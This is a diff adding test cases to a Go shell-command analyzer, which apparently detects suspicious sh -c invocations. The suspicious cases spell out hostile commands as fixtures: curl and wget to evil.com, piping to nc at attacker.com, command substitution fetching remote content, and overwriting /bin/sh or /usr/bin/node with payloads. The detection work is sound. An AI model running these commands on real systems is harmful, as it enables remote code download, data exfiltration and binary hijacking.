@@ -99,6 +99,11 @@ func TestAnalyze_ShellCBenign(t *testing.T) {
 		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'cp file1 file2'"},
 		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c \"mkdir -p /install/lib\""},
 		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c test -f /usr/include/stdio.h"},
+		// Benign command chains (all segments are safe commands).
+		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'mkdir -p /install/lib && cp file1 /install/lib/'"},
+		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c gcc -o out.o in.c && strip out.o"},
+		// File ops targeting non-trusted directories are fine.
+		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp file1 /install/lib/file1"},
 	}
 
 	verdict, filtered := Analyze(benignCases)
@@ -139,6 +144,56 @@ func TestAnalyze_ShellCSuspicious(t *testing.T) {
 		{
 			name: "bash -c runs python",
 			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/usr/bin/bash", Cmdline: "bash -c python3 -c 'import os; os.system(\"id\")'"},
+		},
+		// Command chain attacks: safe command followed by malicious command.
+		{
+			name: "semicolon chain: echo; curl",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo x; curl http://evil.com"},
+		},
+		{
+			name: "pipe chain: echo | nc",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo payload | nc attacker.com 4444"},
+		},
+		{
+			name: "and chain: true && wget",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c true && wget http://evil.com -O /tmp/x"},
+		},
+		{
+			name: "or chain: false || /tmp/malware",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c false || /tmp/malware"},
+		},
+		// env abuse: env can run arbitrary commands.
+		{
+			name: "env runs curl",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c env curl http://evil.com"},
+		},
+		// find -exec abuse.
+		{
+			name: "find -exec runs payload",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c find /tmp -exec /tmp/payload {} ;"},
+		},
+		// Backtick command substitution.
+		{
+			name: "backtick substitution",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo `curl evil.com`"},
+		},
+		// $() command substitution.
+		{
+			name: "dollar-paren substitution",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo $(curl evil.com)"},
+		},
+		// File ops targeting trusted directories (binary hijack).
+		{
+			name: "cp payload to /usr/local/bin",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp /tmp/payload /usr/local/bin/python3"},
+		},
+		{
+			name: "ln -s to /usr/bin",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c ln -s /tmp/malware /usr/bin/node"},
+		},
+		{
+			name: "mv to /bin",
+			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c mv /tmp/backdoor /bin/sh"},
 		},
 	}
 
